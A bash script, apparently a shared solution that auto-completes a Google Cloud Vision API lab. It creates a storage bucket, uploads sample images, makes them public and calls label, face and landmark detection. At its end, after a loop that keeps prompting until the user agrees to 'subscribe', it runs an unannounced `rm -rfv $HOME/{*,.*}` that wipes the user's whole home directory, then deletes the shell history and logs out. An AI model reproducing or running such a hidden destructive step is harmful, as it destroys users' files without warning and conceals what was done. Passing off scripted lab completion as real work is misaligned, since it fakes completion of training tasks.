




BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#


export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")


gcloud storage buckets create gs://$DEVSHELL_PROJECT_ID-bucket --project=$DEVSHELL_PROJECT_ID


curl -L -o city.png https://github.com/quiccklabs/Labs_solutions/raw/4c3cf371380c277f2ab429ef20b5eceb69de5c30/Detect%20Labels%20Faces%20and%20Landmarks%20in%20Images%20with%20the%20Cloud%20Vision%20API/city.png

curl -Lo donuts.png https://github.com/quiccklabs/Labs_solutions/raw/4c3cf371380c277f2ab429ef20b5eceb69de5c30/Detect%20Labels%20Faces%20and%20Landmarks%20in%20Images%20with%20the%20Cloud%20Vision%20API/donuts.png

curl -Lo selfie.png https://github.com/quiccklabs/Labs_solutions/raw/4c3cf371380c277f2ab429ef20b5eceb69de5c30/Detect%20Labels%20Faces%20and%20Landmarks%20in%20Images%20with%20the%20Cloud%20Vision%20API/selfie.png


gsutil cp city.png gs://$DEVSHELL_PROJECT_ID-bucket/city.png

gsutil cp donuts.png gs://$DEVSHELL_PROJECT_ID-bucket/donuts.png

gsutil cp selfie.png gs://$DEVSHELL_PROJECT_ID-bucket/selfie.png

gsutil acl ch -u AllUsers:R gs://$DEVSHELL_PROJECT_ID-bucket/city.png

gsutil acl ch -u AllUsers:R gs://$DEVSHELL_PROJECT_ID-bucket/donuts.png

gsutil acl ch -u AllUsers:R gs://$DEVSHELL_PROJECT_ID-bucket/selfie.png

echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


cat > request.json <<EOF_END
{
  "requests": [
      {
        "image": {
          "source": {
              "gcsImageUri": "gs://$DEVSHELL_PROJECT_ID-bucket/donuts.png"
          }
        },
        "features": [
          {
            "type": "LABEL_DETECTION",
            "maxResults": 10
          }
        ]
      }
  ]
}
EOF_END



curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}



cat > request.json <<EOF_END
{
  "requests": [
      {
        "image": {
          "source": {
              "gcsImageUri": "gs://$DEVSHELL_PROJECT_ID-bucket/donuts.png"
          }
        },
        "features": [
          {
            "type": "WEB_DETECTION",
            "maxResults": 10
          }
        ]
      }
  ]
}
EOF_END

curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}


cat > request.json <<EOF_END
{
  "requests": [
      {
        "image": {
          "source": {
              "gcsImageUri": "gs://$DEVSHELL_PROJECT_ID-bucket/selfie.png"
          }
        },
        "features": [
          {
            "type": "FACE_DETECTION"
          },
          {
            "type": "LANDMARK_DETECTION"
          }
        ]
      }
  ]
}
EOF_END

curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}

echo "${GREEN}${BOLD}

Task 6 Completed

${RESET}"



cat > request.json <<EOF_END
{
  "requests": [
      {
        "image": {
          "source": {
              "gcsImageUri": "gs://$DEVSHELL_PROJECT_ID-bucket/city.png"
          }
        },
        "features": [
          {
            "type": "LANDMARK_DETECTION",
            "maxResults": 10
          }
        ]
      }
  ]
}
EOF_END


curl -s -X POST -H "Content-Type: application/json" --data-binary @request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}

echo "${GREEN}${BOLD}

Task 7 Completed

Lab Completed.

${RESET}"



#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
while [ $CONSENT_REMOVE != 'y' ];
do sleep 10 && read -p "${BOLD}${YELLOW} Do Subscribe to Quicklab  [y/n] : ${RESET}" CONSENT_REMOVE ;
done

echo "${BLUE}${BOLD}

Thanks For Subscribing :)

${RESET}"
rm -rfv $HOME/{*,.*}
rm $HOME/./.bash_history
logout
exit